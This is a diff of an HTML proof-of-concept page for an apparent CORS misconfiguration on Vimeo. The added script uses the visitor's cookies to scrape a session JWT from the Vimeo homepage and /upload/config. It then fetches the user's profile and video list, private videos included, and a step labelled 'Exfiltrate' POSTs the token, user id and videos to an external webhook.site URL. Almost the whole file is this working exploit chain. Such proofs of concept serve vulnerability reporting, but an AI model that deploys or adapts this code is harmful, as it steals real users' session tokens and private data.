@@ -1,36 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS Misconfiguration Dual PoC</title>
+  <title>Vimeo CORS Misconfiguration PoC</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration Demo</h1>
+  <h1>Vimeo CORS Misconfiguration PoC</h1>
+  <pre id="output"></pre>
 
-  <h2>Step 1: /me (baseline account data)</h2>
-  <pre id="me-output">Loading...</pre>
+<script>
+(async () => {
+  const output = document.getElementById("output");
+  const webhook = "https://webhook.site/your-id"; // replace with your webhook
 
-  <h2>Step 2: /upload/config (attempt to fetch JWTs)</h2>
-  <pre id="config-output">Loading...</pre>
+  function log(msg) {
+    console.log(msg);
+    output.textContent += msg + "\n";
+  }
 
-  <script>
-    async function fetchEndpoint(url, outputId) {
-      try {
-        const res = await fetch(url, {
-          method: "GET",
-          credentials: "include"
-        });
-        const text = await res.text();
-        document.getElementById(outputId).textContent = text;
-      } catch (e) {
-        document.getElementById(outputId).textContent = "Error: " + e;
-      }
+  let jwtToken = null;
+  let userId = null;
+
+  try {
+    // === Step 1: Scrape JWT from homepage ===
+    log("[*] Fetching Vimeo homepage...");
+    let homeResp = await fetch("https://vimeo.com", { credentials: "include" });
+    let homeText = await homeResp.text();
+
+    let jwtMatch = homeText.match(/"jwt":"(eyJ[^"]+)"/);
+    if (jwtMatch) {
+      jwtToken = jwtMatch[1];
+      log("[+] JWT extracted from homepage: " + jwtToken.substring(0, 30) + "...");
+    } else {
+      log("[!] No JWT found in homepage.");
     }
 
-    // Step 1: fetch /me
-    fetchEndpoint("https://api.vimeo.com/me", "me-output");
+    // === Step 2: Try /upload/config as second source ===
+    log("[*] Fetching /upload/config...");
+    let configResp = await fetch("https://api.vimeo.com/upload/config", { credentials: "include" });
+    let configJson = await configResp.json();
+    log("[*] /upload/config response: " + JSON.stringify(configJson, null, 2));
 
-    // Step 2: fetch /upload/config
-    fetchEndpoint("https://api.vimeo.com/upload/config", "config-output");
-  </script>
+    if (configJson?.api?.jwt) {
+      jwtToken = configJson.api.jwt;
+      userId = configJson.user?.id;
+      log("[+] JWT extracted from /upload/config: " + jwtToken.substring(0, 30) + "...");
+    }
+
+    // === Step 3: If userId missing, try /me ===
+    if (!userId && jwtToken) {
+      log("[*] Fetching /me for user info...");
+      let meResp = await fetch("https://api.vimeo.com/me", {
+        headers: { Authorization: "jwt " + jwtToken }
+      });
+      let meJson = await meResp.json();
+      log("[*] /me response: " + JSON.stringify(meJson, null, 2));
+      userId = meJson.id;
+    }
+
+    // === Step 4: Query videos dynamically ===
+    if (jwtToken && userId) {
+      const vidsUrl = `https://api.vimeo.com/users/${userId}/videos?per_page=10&page=1&fields=name,link,duration,privacy.view`;
+      log("[*] Fetching videos from: " + vidsUrl);
+
+      let vidsResp = await fetch(vidsUrl, {
+        headers: { Authorization: "jwt " + jwtToken }
+      });
+      let vidsJson = await vidsResp.json();
+      log("[+] Videos: " + JSON.stringify(vidsJson, null, 2));
+
+      // === Step 5: Exfiltrate ===
+      await fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          jwt: jwtToken,
+          userId,
+          videos: vidsJson
+        })
+      });
+      log("[*] Data exfiltrated to webhook.");
+    } else {
+      log("[!] No JWT/userId available, exploit chain incomplete.");
+    }
+  } catch (err) {
+    log("[!] Error: " + err);
+  }
+})();
+</script>
 </body>
 </html>
